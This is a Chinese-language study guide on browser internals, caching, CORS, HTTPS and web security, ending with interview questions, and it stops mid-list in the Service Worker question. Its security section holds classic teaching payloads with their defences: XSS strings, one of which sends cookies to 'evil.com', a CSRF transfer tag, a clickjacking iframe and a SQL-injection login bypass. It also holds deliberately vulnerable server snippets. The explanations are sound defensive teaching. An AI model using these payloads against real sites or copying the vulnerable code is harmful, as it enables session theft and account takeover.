# 浏览器原理与Web安全

---

## 📑 目录

### 浏览器原理
1. [浏览器架构](#浏览器架构)（多进程架构、渲染进程）
2. [页面渲染原理](#页面渲染原理)（关键渲染路径、重排与重绘、合成层优化）
3. [浏览器缓存](#浏览器缓存)（强缓存、协商缓存、缓存策略）

### 网络与跨域
4. [跨域问题](#跨域问题)（同源策略、CORS、其他跨域方案）
5. [HTTPS原理](#https原理)

### Web安全与自查
6. [Web安全](#web安全)（XSS、CSRF、点击劫持、SQL注入、中间人攻击）
7. [面试题自查](#面试题自查)

---

## 浏览器架构

### 多进程架构

**Chrome浏览器的进程模型**：

```
Chrome 多进程架构：
┌─────────────────────────────────────┐
│      Browser Process（浏览器进程）    │
│  - UI线程（地址栏、前进/后退按钮）    │
│  - Network线程（网络请求）            │
│  - Storage线程（数据存储）            │
└─────────────────────────────────────┘
         │
         ├─► Renderer Process（渲染进程，每个标签页一个）
         │   - Main Thread（主线程：JS执行、DOM解析）
         │   - Compositor Thread（合成线程：滚动、动画）
         │   - Raster Thread（光栅化线程：位图绘制）
         │
         ├─► GPU Process（GPU进程）
         │   - 处理3D CSS、Canvas、WebGL
         │
         └─► Plugin Process（插件进程，如Flash）
```

**为什么要多进程？**

1. **稳定性**：单个标签页崩溃不影响其他标签页
2. **安全性**：渲染进程沙箱隔离，恶意代码无法访问系统资源
3. **性能**：多核CPU并行处理

**缺点**：内存占用高（每个进程有独立的内存空间）

---

### 渲染进程

**渲染进程的线程**：

```
Renderer Process：
├─ Main Thread（主线程）⭐
│  - JavaScript执行
│  - DOM/CSSOM构建
│  - Layout（布局计算）
│  - Paint（绘制指令生成）
│
├─ Compositor Thread（合成线程）
│  - 滚动处理
│  - 动画优化（CSS Animation/Transform）
│
├─ Raster Thread（光栅化线程，多个）
│  - 将绘制指令转换为位图
│
└─ Worker Thread（Web Worker）
   - 后台JS执行（不阻塞主线程）
```

---

## 页面渲染原理

### 关键渲染路径

**从HTML到屏幕的完整流程**：

```
1. HTML解析 → DOM Tree
   └─ 遇到<script>标签：暂停解析，执行JS（阻塞）
   └─ 遇到<img>标签：异步加载图片（不阻塞）

2. CSS解析 → CSSOM Tree
   └─ CSS加载和解析会阻塞渲染（CSSOM构建完成前不渲染）

3. DOM + CSSOM → Render Tree
   └─ 只包含可见元素（display:none不在Render Tree中）

4. Layout（布局/回流）
   └─ 计算每个元素的位置和大小

5. Paint（绘制）
   └─ 生成绘制指令（DrawRect、DrawText等）

6. Composite（合成）
   └─ 多个图层合成最终画面
```

**详细流程图**：

```
┌──────────┐
│  HTML    │
└────┬─────┘
     │ Parse
     ▼
┌──────────┐        ┌──────────┐
│ DOM Tree │        │   CSS    │
└────┬─────┘        └────┬─────┘
     │                   │ Parse
     │                   ▼
     │              ┌──────────┐
     │              │CSSOM Tree│
     │              └────┬─────┘
     └────────┬──────────┘
              ▼
         ┌──────────┐
         │Render Tree│
         └────┬─────┘
              │
         ┌────┴────┐
         │ Layout  │ ← 计算位置大小
         └────┬────┘
              │
         ┌────┴────┐
         │  Paint  │ ← 生成绘制指令
         └────┬────┘
              │
         ┌────┴────┐
         │Composite│ ← 图层合成
         └────┬────┘
              │
         ┌────┴────┐
         │ Display │
         └─────────┘
```

---

### 重排与重绘

#### 重排（Reflow / Layout）

**定义**：元素的位置或大小发生变化，需要重新计算布局。

**触发条件**：
```javascript
// 1. 修改几何属性
element.style.width = '100px';
element.style.height = '100px';
element.style.padding = '10px';
element.style.margin = '10px';

// 2. 修改DOM结构
element.appendChild(newElement);
element.removeChild(child);

// 3. 读取布局属性（强制同步布局）⚠️
const height = element.offsetHeight;  // 触发重排
const width = element.clientWidth;    // 触发重排
const rect = element.getBoundingClientRect();  // 触发重排

// 4. 窗口大小变化
window.addEventListener('resize', () => {
  // 触发重排
});
```

**重排的代价**：
- 需要重新计算所有受影响元素的位置和大小
- 可能影响整个文档（如修改body的宽度）
- 性能开销大

---

#### 重绘（Repaint）

**定义**：元素的外观发生变化（颜色、背景等），但位置和大小不变。

**触发条件**：
```javascript
// 修改视觉属性
element.style.color = 'red';
element.style.backgroundColor = 'blue';
element.style.visibility = 'hidden';  // 重绘但不重排
```

**重绘的代价**：
- 只需要重新绘制元素
- 比重排开销小
- 但仍然有性能损耗

---

#### 优化策略

**1. 批量修改DOM**

```javascript
// ❌ 糟糕：每次修改都触发重排
element.style.width = '100px';  // 重排
element.style.height = '100px'; // 重排
element.style.padding = '10px'; // 重排

// ✅ 优化1：使用cssText
element.style.cssText = 'width:100px; height:100px; padding:10px;';  // 只触发一次重排

// ✅ 优化2：使用CSS类
element.className = 'updated';  // 只触发一次重排
```

**2. 离线操作DOM**

```javascript
// ❌ 糟糕：循环中修改DOM
for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  div.textContent = i;
  document.body.appendChild(div);  // 每次都触发重排
}

// ✅ 优化：使用DocumentFragment
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  div.textContent = i;
  fragment.appendChild(div);  // 不触发重排
}
document.body.appendChild(fragment);  // 只触发一次重排
```

**3. 避免强制同步布局**

```javascript
// ❌ 糟糕：读写交错（Layout Thrashing）
for (let i = 0; i < 100; i++) {
  const height = element.offsetHeight;  // 读取布局（触发重排）
  element.style.height = height + 10 + 'px';  // 修改布局（标记需要重排）
}
// 每次循环都触发重排（100次）

// ✅ 优化：先读后写
const height = element.offsetHeight;  // 只触发一次重排
for (let i = 0; i < 100; i++) {
  element.style.height = height + 10 * i + 'px';
}
```

**4. 使用transform和opacity**

```javascript
// ❌ 糟糕：修改 left/top（触发重排）
element.style.left = '100px';

// ✅ 优化：使用 transform（只触发合成，不重排不重绘）
element.style.transform = 'translateX(100px)';

// ❌ 糟糕：修改 visibility（触发重绘）
element.style.visibility = 'hidden';

// ✅ 优化：使用 opacity（只触发合成）
element.style.opacity = '0';
```

---

### 合成层优化

#### 什么是合成层？

```
浏览器渲染的层级结构：
┌────────────────────────────┐
│   Document（文档层）        │
│  ┌──────────────────────┐  │
│  │  Layer 1（普通层）    │  │
│  └──────────────────────┘  │
│  ┌──────────────────────┐  │
│  │  Layer 2（合成层）    │  │ ← transform、opacity、will-change
│  │  - 独立位图            │  │
│  │  - GPU加速            │  │
│  └──────────────────────┘  │
└────────────────────────────┘
```

**提升为合成层的条件**：
1. 3D或透视变换（`transform: translateZ(0)`）
2. `will-change: transform`
3. `<video>`、`<canvas>`、`<iframe>`
4. CSS动画（`animation`、`transition`）

---

#### 合成层的优势

```javascript
// ❌ 普通动画（触发重排/重绘）
@keyframes move {
  from { left: 0; }
  to { left: 100px; }
}

// ✅ 合成层动画（只触发合成，GPU加速）
@keyframes move-optimized {
  from { transform: translateX(0); }
  to { transform: translateX(100px); }
}

// 手动提升为合成层
.optimized {
  will-change: transform;  // 告诉浏览器即将变化
}
```

**注意**：过多的合成层会增加内存占用！

---

## 浏览器缓存

### 强缓存

**定义**：浏览器直接从本地缓存读取资源，不发送请求到服务器。

**控制字段**：

**1. Expires**（HTTP/1.0）
```http
# 响应头
Expires: Wed, 21 Oct 2025 07:28:00 GMT

# 缺点：使用绝对时间，受客户端时间影响
```

**2. Cache-Control**（HTTP/1.1，优先级高于Expires）
```http
# 响应头
Cache-Control: max-age=31536000  # 缓存1年

# 常用指令：
Cache-Control: no-cache       # 使用协商缓存
Cache-Control: no-store       # 不缓存（敏感数据）
Cache-Control: public         # 可被任何缓存器缓存
Cache-Control: private        # 只能被浏览器缓存（不能被CDN缓存）
Cache-Control: immutable      # 资源永远不变（适合静态资源+hash文件名）
```

**流程**：
```
浏览器请求资源
    ↓
检查缓存是否过期？
    ├─ 未过期 → 直接使用缓存（200 from disk cache）
    └─ 已过期 → 协商缓存
```

---

### 协商缓存

**定义**：浏览器向服务器询问缓存是否可用，如果可用返回304，否则返回200和新资源。

**控制字段**：

**1. Last-Modified / If-Modified-Since**（秒级精度）
```http
# 首次请求
Response:
  Last-Modified: Wed, 21 Oct 2024 07:28:00 GMT

# 再次请求
Request:
  If-Modified-Since: Wed, 21 Oct 2024 07:28:00 GMT

# 服务器响应
- 未修改：304 Not Modified（不返回资源内容）
- 已修改：200 OK（返回新资源）
```

**2. ETag / If-None-Match**（优先级高于Last-Modified）
```http
# 首次请求
Response:
  ETag: "33a64df551425fcc55e4d42a148795d9f25f89d4"

# 再次请求
Request:
  If-None-Match: "33a64df551425fcc55e4d42a148795d9f25f89d4"

# 服务器响应
- ETag匹配：304 Not Modified
- ETag不匹配：200 OK（返回新资源）
```

**ETag vs Last-Modified**：

| 特性 | Last-Modified | ETag |
|------|--------------|------|
| **精度** | 秒级 | 内容哈希（更精确） |
| **性能** | 快（直接比较时间戳） | 慢（需要计算哈希） |
| **适用场景** | 文件很少修改 | 文件内容为准 |

---

### 缓存策略

**最佳实践**：

```
HTML文件：
  Cache-Control: no-cache  # 每次都协商缓存（保证最新）
  ETag: "xxx"

静态资源（JS/CSS/图片，文件名带hash）：
  Cache-Control: max-age=31536000, immutable  # 强缓存1年
  # 因为文件名变化，不用担心缓存问题

API接口：
  Cache-Control: no-store  # 不缓存（实时数据）
```

**示例配置**（Nginx）：
```nginx
# HTML文件：协商缓存
location ~* \.html$ {
  add_header Cache-Control "no-cache";
  etag on;
}

# 静态资源：强缓存
location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg|woff|woff2)$ {
  add_header Cache-Control "max-age=31536000, immutable";
}

# API接口：不缓存
location /api/ {
  add_header Cache-Control "no-store";
}
```

---

## 跨域问题

### 同源策略

**定义**：浏览器限制一个源（协议+域名+端口）的文档或脚本访问另一个源的资源。

**同源判断**：
```
URL1: https://example.com:443/page1
URL2: https://example.com:443/page2  ✅ 同源

URL1: https://example.com:443/page
URL2: http://example.com:443/page    ❌ 不同源（协议不同）
URL2: https://api.example.com/page   ❌ 不同源（域名不同）
URL2: https://example.com:8080/page  ❌ 不同源（端口不同）
```

**同源策略限制**：
1. 无法读取Cookie、LocalStorage、IndexedDB
2. 无法操作DOM
3. 无法发送AJAX请求（除非CORS允许）

**不受同源策略限制的标签**：
- `<script src="...">`
- `<link href="...">`
- `<img src="...">`
- `<iframe src="...">`
- `<video src="...">`、`<audio src="...">`

---

### CORS

**定义**：Cross-Origin Resource Sharing（跨域资源共享），服务器通过响应头允许浏览器跨域访问。

#### 简单请求

**条件**：
1. 方法：GET、POST、HEAD
2. 请求头：Accept、Accept-Language、Content-Language、Content-Type（限 `application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain`）

**流程**：
```http
# 浏览器自动添加Origin
GET /api/users HTTP/1.1
Origin: https://example.com

# 服务器响应
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://example.com  # 允许的源
Access-Control-Allow-Credentials: true            # 允许携带Cookie

# 如果允许所有源（不安全）
Access-Control-Allow-Origin: *
```

---

#### 预检请求（Preflight）

**条件**：非简单请求（如PUT、DELETE、自定义请求头）

**流程**：
```http
# 1. 浏览器发送OPTIONS预检请求
OPTIONS /api/users HTTP/1.1
Origin: https://example.com
Access-Control-Request-Method: PUT                 # 实际请求方法
Access-Control-Request-Headers: Content-Type       # 实际请求头

# 2. 服务器响应预检请求
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400  # 预检结果缓存24小时

# 3. 浏览器发送实际请求
PUT /api/users HTTP/1.1
Origin: https://example.com
Content-Type: application/json

# 4. 服务器响应实际请求
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://example.com
```

**服务器配置示例**（Express）：
```javascript
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', 'https://example.com');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.header('Access-Control-Allow-Credentials', 'true');
  
  // 处理预检请求
  if (req.method === 'OPTIONS') {
    return res.sendStatus(204);
  }
  
  next();
});
```

---

### 其他跨域方案

**1. JSONP**（仅支持GET）

```javascript
// 原理：利用<script>标签不受同源策略限制
function jsonp(url, callback) {
  const script = document.createElement('script');
  window[callback] = (data) => {
    console.log(data);
    document.body.removeChild(script);
  };
  script.src = `${url}?callback=${callback}`;
  document.body.appendChild(script);
}

jsonp('https://api.example.com/users', 'handleUsers');

// 服务器返回：
handleUsers({"users": [...]})
```

**缺点**：
- 只支持GET请求
- 不安全（无法验证数据来源）
- 错误处理困难

---

**2. 代理服务器**

```
浏览器 → 同源的代理服务器 → 跨域API

示例（开发环境Webpack配置）：
devServer: {
  proxy: {
    '/api': {
      target: 'https://api.example.com',
      changeOrigin: true,
      pathRewrite: { '^/api': '' }
    }
  }
}

浏览器请求：http://localhost:3000/api/users
代理转发：https://api.example.com/users
```

---

**3. postMessage**（iframe通信）

```javascript
// 父页面（https://a.com）
const iframe = document.querySelector('iframe');
iframe.contentWindow.postMessage('Hello', 'https://b.com');

window.addEventListener('message', (event) => {
  if (event.origin === 'https://b.com') {
    console.log(event.data);  // iframe的响应
  }
});

// iframe页面（https://b.com）
window.addEventListener('message', (event) => {
  if (event.origin === 'https://a.com') {
    console.log(event.data);  // 'Hello'
    event.source.postMessage('Hi', event.origin);
  }
});
```

---

## Web安全

### XSS攻击

**定义**：Cross-Site Scripting（跨站脚本攻击），攻击者注入恶意脚本到网页。

#### 反射型XSS

**原理**：恶意脚本通过URL参数传递，服务器直接返回。

```javascript
// 漏洞代码
app.get('/search', (req, res) => {
  const keyword = req.query.q;
  res.send(`<h1>搜索结果：${keyword}</h1>`);  // 直接输出用户输入
});

// 攻击URL
https://example.com/search?q=<script>alert(document.cookie)</script>

// 页面输出
<h1>搜索结果：<script>alert(document.cookie)</script></h1>
// 脚本执行，窃取Cookie
```

---

#### 存储型XSS

**原理**：恶意脚本存储到数据库，所有访问该页面的用户都会被攻击。

```javascript
// 漏洞代码
// 用户发表评论
db.comments.insert({ content: req.body.content });

// 显示评论
comments.forEach(comment => {
  html += `<p>${comment.content}</p>`;  // 直接输出数据库内容
});

// 攻击者发表评论
content: "<script>fetch('https://evil.com?cookie=' + document.cookie)</script>"

// 所有访问评论页面的用户都会被攻击
```

---

#### DOM型XSS

**原理**：前端直接使用用户输入修改DOM。

```javascript
// 漏洞代码
const keyword = location.search.split('q=')[1];
document.getElementById('result').innerHTML = `搜索：${keyword}`;

// 攻击URL
https://example.com/search?q=<img src=x onerror=alert(1)>
```

---

#### 防御XSS

**1. 输出转义**

```javascript
// ❌ 危险
res.send(`<h1>${userInput}</h1>`);

// ✅ 安全：转义HTML特殊字符
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}
res.send(`<h1>${escapeHtml(userInput)}</h1>`);

// React会自动转义
<h1>{userInput}</h1>  // 自动转义
<h1 dangerouslySetInnerHTML={{__html: userInput}} />  // 危险⚠️
```

**2. CSP（Content Security Policy）**

```http
# 响应头
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com

# 只允许加载同源脚本和 https://trusted.com 的脚本
# 禁止内联脚本（<script>alert(1)</script>）
```

**3. HttpOnly Cookie**

```http
Set-Cookie: sessionId=abc123; HttpOnly; Secure

# HttpOnly：JavaScript无法读取Cookie（document.cookie）
# Secure：只通过HTTPS传输
```

---

### CSRF攻击

**定义**：Cross-Site Request Forgery（跨站请求伪造），攻击者诱导用户在已登录的网站执行非本意操作。

**攻击场景**：
```html
<!-- 攻击者的网站（evil.com） -->
<img src="https://bank.com/transfer?to=attacker&amount=1000" />

<!-- 用户访问evil.com时，浏览器自动发送请求到bank.com -->
<!-- 如果用户已登录bank.com，请求会携带Cookie -->
<!-- 转账成功！ -->
```

---

#### 防御CSRF

**1. CSRF Token**

```javascript
// 服务器生成Token
app.get('/form', (req, res) => {
  const csrfToken = generateToken();
  req.session.csrfToken = csrfToken;
  res.render('form', { csrfToken });
});

// 表单包含Token
<form method="POST" action="/transfer">
  <input type="hidden" name="csrf_token" value="{{ csrfToken }}" />
  <input name="to" />
  <input name="amount" />
  <button type="submit">转账</button>
</form>

// 服务器验证Token
app.post('/transfer', (req, res) => {
  if (req.body.csrf_token !== req.session.csrfToken) {
    return res.status(403).send('Invalid CSRF token');
  }
  // 处理转账
});
```

**2. SameSite Cookie**

```http
Set-Cookie: sessionId=abc123; SameSite=Strict

# SameSite=Strict：Cookie只在同站请求时发送
# SameSite=Lax：导航到目标网站时发送（GET请求）
# SameSite=None：所有请求都发送（需要配合Secure）
```

**3. 验证Referer**

```javascript
app.post('/transfer', (req, res) => {
  const referer = req.headers.referer;
  if (!referer || !referer.startsWith('https://bank.com')) {
    return res.status(403).send('Invalid referer');
  }
  // 处理转账
});

// 缺点：Referer可以被篡改或禁用
```

---

### 点击劫持

**定义**：Clickjacking，攻击者将目标网站嵌入透明iframe，诱导用户点击。

**攻击场景**：
```html
<!-- 攻击者的网站 -->
<style>
  iframe {
    opacity: 0;  /* 完全透明 */
    position: absolute;
    top: 0;
    left: 0;
    width: 500px;
    height: 500px;
  }
</style>

<h1>点击领取奖品！</h1>
<button>领取</button>

<iframe src="https://bank.com/transfer?to=attacker&amount=1000"></iframe>

<!-- 用户以为点击"领取"按钮，实际点击的是iframe中的"确认转账"按钮 -->
```

---

#### 防御点击劫持

**1. X-Frame-Options**

```http
# 响应头
X-Frame-Options: DENY  # 禁止被任何页面嵌入iframe
X-Frame-Options: SAMEORIGIN  # 只允许同源页面嵌入
```

**2. CSP frame-ancestors**

```http
Content-Security-Policy: frame-ancestors 'self' https://trusted.com

# 只允许同源和 https://trusted.com 嵌入
```

**3. JavaScript防御**

```javascript
// 检测是否在iframe中
if (top !== self) {
  top.location = self.location;  // 跳转到顶层页面
}
```

---

### SQL注入

**定义**：攻击者通过输入恶意SQL代码，破坏数据库查询。

**攻击场景**：
```javascript
// 漏洞代码
const username = req.body.username;
const password = req.body.password;
const sql = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
db.query(sql);

// 攻击输入
username: admin' OR '1'='1
password: anything

// 实际SQL
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
// '1'='1' 永远为真，绕过密码验证
```

---

#### 防御SQL注入

**1. 参数化查询**

```javascript
// ✅ 安全：使用占位符
const sql = 'SELECT * FROM users WHERE username=? AND password=?';
db.query(sql, [username, password]);

// 数据库驱动会自动转义特殊字符
```

**2. ORM**

```javascript
// 使用ORM（如Sequelize、TypeORM）
const user = await User.findOne({
  where: { username, password }
});
// ORM自动处理SQL注入问题
```

**3. 输入验证**

```javascript
// 白名单验证
const usernameRegex = /^[a-zA-Z0-9_]{3,20}$/;
if (!usernameRegex.test(username)) {
  return res.status(400).send('Invalid username');
}
```

---

### 中间人攻击

**定义**：Man-in-the-Middle Attack（MITM），攻击者拦截客户端和服务器之间的通信。

**攻击场景**：
```
Client → Attacker → Server

1. 客户端发送请求：GET /login
2. 攻击者拦截请求，修改为：GET /login?redirect=https://evil.com
3. 服务器响应
4. 攻击者拦截响应，窃取密码
```

---

#### 防御中间人攻击

**1. HTTPS**

- 使用TLS加密通信
- 服务器身份验证（证书）
- 数据完整性（无法篡改）

**2. HSTS**（HTTP Strict Transport Security）

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains

# 强制浏览器使用HTTPS访问网站（1年内）
# 即使用户输入 http://example.com，浏览器自动转换为 https://example.com
```

**3. 证书固定**（Certificate Pinning）

```javascript
// 移动应用：验证服务器证书指纹
const expectedFingerprint = 'sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=';
if (actualFingerprint !== expectedFingerprint) {
  throw new Error('Certificate mismatch');
}
```

---

## HTTPS原理

### TLS握手过程

```
Client                                Server
  │                                     │
  │─── ClientHello ──────────────────►│
  │    (支持的加密套件、随机数)         │
  │                                     │
  │◄── ServerHello ───────────────────│
  │    (选择的加密套件、随机数、证书)   │
  │                                     │
  │─── ClientKeyExchange ─────────────►│
  │    (用服务器公钥加密的预主密钥)     │
  │                                     │
  │─── ChangeCipherSpec ──────────────►│
  │    (后续使用对称加密)               │
  │                                     │
  │◄── ChangeCipherSpec ──────────────│
  │                                     │
  │═══ 对称加密通信 ═══════════════════│
```

**详细步骤**：

1. **ClientHello**：客户端发送支持的TLS版本、加密套件、随机数（Client Random）
2. **ServerHello**：服务器选择加密套件、发送随机数（Server Random）、发送证书
3. **客户端验证证书**：检查证书是否由可信CA签发、是否过期、是否匹配域名
4. **ClientKeyExchange**：客户端生成预主密钥（Pre-Master Secret），用服务器公钥加密后发送
5. **生成会话密钥**：客户端和服务器用 Client Random + Server Random + Pre-Master Secret 生成对称密钥
6. **ChangeCipherSpec**：双方切换到对称加密通信

---

### 对称加密 vs 非对称加密

**对称加密**（如AES）：
- 加密和解密使用同一密钥
- 速度快
- 用于通信内容加密

**非对称加密**（如RSA）：
- 加密和解密使用不同密钥（公钥/私钥）
- 速度慢
- 用于密钥交换、数字签名

**HTTPS结合两者**：
- 非对称加密交换对称密钥（TLS握手）
- 对称加密通信内容（TLS记录协议）

---

## 面试题自查

### Q1：浏览器输入URL到页面显示的完整过程？

**答**：
```
1. URL解析
   - 判断是URL还是搜索关键词
   - 解析协议、域名、端口、路径

2. DNS解析
   - 浏览器缓存 → 系统缓存 → 路由器缓存 → ISP DNS → 根域名服务器
   - 域名 → IP地址

3. TCP连接
   - 三次握手建立连接
   - 如果是HTTPS，还有TLS握手

4. 发送HTTP请求
   - 请求行、请求头、请求体
   - 携带Cookie

5. 服务器处理请求
   - 接收请求 → 处理 → 返回响应

6. 浏览器接收响应
   - 检查状态码（200/301/304/404等）
   - 检查缓存（协商缓存304）

7. 解析HTML
   - 构建DOM Tree
   - 遇到CSS：异步加载，但阻塞渲染
   - 遇到JS：阻塞DOM解析（除非async/defer）

8. 解析CSS
   - 构建CSSOM Tree

9. 生成Render Tree
   - DOM + CSSOM → Render Tree
   - 不包含display:none元素

10. Layout（布局）
    - 计算每个元素的位置和大小

11. Paint（绘制）
    - 生成绘制指令

12. Composite（合成）
    - 多图层合成最终画面

13. 显示页面
```

---

### Q2：如何优化首屏加载速度？

**答**：
```javascript
// 1. 资源优化
// - 压缩JS/CSS/HTML（Terser、cssnano）
// - 图片压缩和格式优化（WebP、AVIF）
// - Tree Shaking去除无用代码
// - Code Splitting代码分割

// 2. 网络优化
// - 使用CDN加速
// - 开启Gzip/Brotli压缩
// - HTTP/2多路复用
// - 预连接：<link rel="preconnect">
// - 预加载：<link rel="preload">
// - DNS预解析：<link rel="dns-prefetch">

// 3. 缓存优化
// - 静态资源设置强缓存（Cache-Control: max-age=31536000）
// - HTML文件设置协商缓存

// 4. 渲染优化
// - SSR服务端渲染
// - SSG静态站点生成
// - 关键CSS内联
// - 非关键CSS异步加载
// - JS放在body底部或使用defer

// 5. 懒加载
// - 图片懒加载（Intersection Observer）
// - 路由懒加载
// - 组件懒加载（React.lazy）

// 6. 骨架屏
// - 提升用户感知速度
```

---

### Q3：如何防御XSS攻击？

**答**：
```javascript
// 1. 输出转义（最重要）
function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  };
  return str.replace(/[&<>"'/]/g, char => map[char]);
}

// 2. CSP（Content Security Policy）
// 响应头：
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
// 禁止内联脚本、只允许白名单域名的脚本

// 3. HttpOnly Cookie
Set-Cookie: sessionId=xxx; HttpOnly; Secure; SameSite=Strict
// JS无法读取Cookie

// 4. 使用现代框架
// React：自动转义JSX内容
// Vue：自动转义模板内容
// 避免使用v-html、dangerouslySetInnerHTML

// 5. 输入验证
// 白名单过滤，拒绝非法字符

// 6. 富文本处理
// 使用DOMPurify等库净化HTML
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirty);
```

---

### Q4：强缓存和协商缓存的区别？

**答**：
```
强缓存：
- 不发请求，直接使用本地缓存
- HTTP头：Cache-Control（优先）、Expires
- 状态码：200 (from disk/memory cache)
- 适用：静态资源（JS/CSS/图片）

协商缓存：
- 发请求询问服务器
- HTTP头：ETag/If-None-Match（优先）、Last-Modified/If-Modified-Since
- 状态码：304 Not Modified（使用缓存）或 200（返回新资源）
- 适用：HTML、API接口

缓存流程：
1. 浏览器请求资源
2. 检查强缓存是否过期？
   - 未过期 → 直接使用缓存（200 from cache）
   - 已过期 → 进入协商缓存
3. 协商缓存
   - 发送If-None-Match/If-Modified-Since
   - 服务器比较
   - 未变化 → 304
   - 已变化 → 200 + 新资源

最佳实践：
- HTML: no-cache + ETag（每次协商）
- 静态资源（带hash）: max-age=31536000（强缓存1年）
- API: no-store（不缓存）
```

---

### Q5：什么是CORS？预检请求是什么？

**答**：
```
CORS（Cross-Origin Resource Sharing）跨域资源共享

同源策略：协议 + 域名 + 端口 相同才能互相访问

简单请求：
- 方法：GET、POST、HEAD
- 请求头：Accept、Content-Type等（Content-Type仅限text/plain、multipart/form-data、application/x-www-form-urlencoded）
- 直接发送，服务器返回Access-Control-Allow-Origin

预检请求（Preflight）：
- 非简单请求先发送OPTIONS请求
- 触发条件：
  * 方法：PUT、DELETE、PATCH
  * 自定义请求头
  * Content-Type: application/json

预检请求流程：
1. 浏览器发送OPTIONS请求
   Origin: https://example.com
   Access-Control-Request-Method: PUT
   Access-Control-Request-Headers: Content-Type

2. 服务器响应
   Access-Control-Allow-Origin: https://example.com
   Access-Control-Allow-Methods: PUT
   Access-Control-Allow-Headers: Content-Type
   Access-Control-Max-Age: 86400  // 预检结果缓存24小时

3. 浏览器发送实际请求

4. 服务器返回数据
```

---

### Q6：重排（Reflow）和重绘（Repaint）的区别？如何优化？

**答**：
```javascript
// 重排（Reflow）：元素位置/大小变化，重新计算布局
// 触发：修改width/height/padding/margin、增删DOM、读取布局属性

// 重绘（Repaint）：元素外观变化，重新绘制
// 触发：修改color/background/visibility

// 性能影响：重排 > 重绘（重排必然导致重绘）

// 优化策略：

// 1. 批量修改样式
// ❌ 多次触发
element.style.width = '100px';
element.style.height = '100px';
// ✅ 一次触发
element.className = 'updated';
// 或
element.style.cssText = 'width:100px;height:100px';

// 2. 离线操作DOM
const fragment = document.createDocumentFragment();
for (let i = 0; i < 100; i++) {
  fragment.appendChild(document.createElement('div'));
}
document.body.appendChild(fragment);

// 3. 避免Layout Thrashing
// ❌ 读写交错
for (let i = 0; i < 100; i++) {
  const h = element.offsetHeight;  // 读（触发重排）
  element.style.height = h + 10 + 'px';  // 写
}
// ✅ 先读后写
const h = element.offsetHeight;
for (let i = 0; i < 100; i++) {
  element.style.height = h + 10 * i + 'px';
}

// 4. 使用transform/opacity（只触发合成）
// ❌ 触发重排
element.style.left = '100px';
// ✅ 只触发合成
element.style.transform = 'translateX(100px)';
```

---

### Q7：浏览器的事件循环（Event Loop）机制？

**答**：
```javascript
// 浏览器Event Loop机制

// 任务类型：
// 1. 宏任务（Macro Task）：setTimeout、setInterval、I/O、UI渲染
// 2. 微任务（Micro Task）：Promise.then、MutationObserver、queueMicrotask

// 执行顺序：
// 1. 执行同步代码（主线程）
// 2. 清空微任务队列
// 3. 执行一个宏任务
// 4. 清空微任务队列
// 5. 重复3-4

console.log('1');  // 同步

setTimeout(() => console.log('2'), 0);  // 宏任务

Promise.resolve().then(() => console.log('3'));  // 微任务

console.log('4');  // 同步

// 输出：1 4 3 2

// 复杂例子
console.log('start');

setTimeout(() => {
  console.log('setTimeout1');
  Promise.resolve().then(() => console.log('promise1'));
}, 0);

Promise.resolve().then(() => {
  console.log('promise2');
  setTimeout(() => console.log('setTimeout2'), 0);
});

console.log('end');

// 输出：start end promise2 setTimeout1 promise1 setTimeout2
```

---

### Q8：什么是合成层（Composite Layer）？如何利用它优化性能？

**答**：
```css
/* 合成层：浏览器为某些元素创建单独的图层，在GPU上渲染 */

/* 触发合成层的条件：
   1. 3D变换：transform: translateZ(0)
   2. will-change: transform/opacity
   3. video、canvas、iframe
   4. CSS动画（transform/opacity）
*/

/* 合成层的优势：
   - 变化时不触发重排重绘
   - GPU加速
   - 与其他层独立，不影响其他元素
*/

/* 优化示例 */
/* ❌ 普通动画（触发重排） */
@keyframes move {
  from { left: 0; }
  to { left: 100px; }
}

/* ✅ 合成层动画（GPU加速） */
@keyframes move-optimized {
  from { transform: translateX(0); }
  to { transform: translateX(100px); }
}

/* 手动创建合成层 */
.optimized {
  will-change: transform;
  /* 或 */
  transform: translateZ(0);
}

/* 注意：
   - 合成层过多会增加内存占用
   - 不要滥用will-change
   - 动画结束后移除will-change
*/
```

---

### Q9：Service Worker是什么？有什么用？

**答**：
```javascript
// Service Worker：独立于网页的后台脚本，实现离线缓存、推送通知等

// 生命周期：installing → installed → activating → activated

// 注册
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js')
    .then(reg => console.log('SW注册成功'))
    .catch(err => console.log('SW注册失败', err));
}

// sw.js
const CACHE_NAME = 'v1';
const CACHE_URLS = ['/', '/index.html', '/style.css', '/app.js'];

// 安装：缓存资源
self.addEventListener('install', event => {
  event.waitUntil(
    caches.open(CACHE_NAME)
      .then(cache => cache.addAll(CACHE_URLS))
  );
});

// 激活：清理旧缓存
self.addEventListener('activate', event => {
  event.waitUntil(
    caches.keys().then(keys => 
      Promise.all(keys
        .filter(key => key !== CACHE_NAME)
        .map(key => caches.delete(key))
      )
    )
  );
});

// 拦截请求：缓存优先策略
self.addEventListener('fetch', event => {
  event.respondWith(
    caches.match(event.request)
      .then(response => response || fetch(event.request))
  );
});

// 应用场景：
